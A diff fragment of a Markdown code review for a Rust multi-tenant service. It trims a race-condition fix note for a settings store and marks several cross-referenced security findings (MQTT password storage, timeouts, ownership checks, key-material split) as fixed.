-           .filter(TenantId.eq(tenant_id))
-           .exec(db).await?;
-   }
-   ```
-
-2. **Simpler alternative:** Ensure the row always exists by inserting it during tenant creation (migration or seed). Then the update path is the only path, eliminating the race entirely.
-
-**Files to modify:**
-- `crates/ui/web-api/src/settings_store.rs` — use upsert or ensure row pre-exists
-
-**Testing:**
-- Concurrent test: multiple threads bumping version for the same tenant → no constraint violation
 
 ---
 
@@ -3657,14 +2353,14 @@ The following findings from `crates/shared/wire/CODEREVIEW.md` are confirmed and
 
 | Wire ID | This Review | Status |
 |---------|-------------|--------|
-| A1 (MQTT password in outbox) | CR-2 | Extended to cover at-rest encryption |
+| A1 (MQTT password in outbox) | CR-2 | Fixed (FP-CR2) |
 | S1 (Argon2 brute-force) | — | Confirmed, fix in wire FP-1 |
-| S2 (Anonymous timeout) | HI-5 | Extended with connection cap |
-| S4 (Unbounded output) | HI-3 | Extended with ownership validation |
+| S2 (Anonymous timeout) | HI-5 | Fixed (wire FP-1 + connection cap) |
+| S4 (Unbounded output) | HI-3 | Fixed (wire FP-17 + ownership validation) |
 | H2 (Cursor advancement) | HI-7 | Confirmed, fix in wire FP-3 |
 | H5 (Lease TOCTOU) | HI-6 | Confirmed, fix in wire FP-8 |
 | D1 (Connection dedup) | — | Confirmed, fix in wire FP-16 |
-| D2 (Update ownership) | HI-3 | Confirmed, fix in wire FP-17 |
+| D2 (Update ownership) | HI-3 | Fixed (wire FP-17) |
 | D3 (Register order) | — | Confirmed, fix in wire FP-18 |
 | D4 (Broadcast lock) | — | Confirmed, fix in wire FP-19 |
 | D5 (Approval timeout) | — | Confirmed, fix in wire FP-20 |
@@ -3685,7 +2381,7 @@ The following findings from `crates/shared/wire/CODEREVIEW.md` are confirmed and
 
 ### Areas for Improvement
 
-1. **Key material surface area.** `CaSnapshotData` conflates metadata with secrets. Split recommended (FP-CR3).
+1. **Key material surface area.** `CaSnapshotData` conflates metadata with secrets. Split recommended (FP-CR3 — implemented).
 
 2. **main.rs monolith.** The `run()` function is 1100+ lines. Extract into `init_pki()`, `init_oidc()`, `start_background_tasks()`, `graceful_shutdown()`.
 
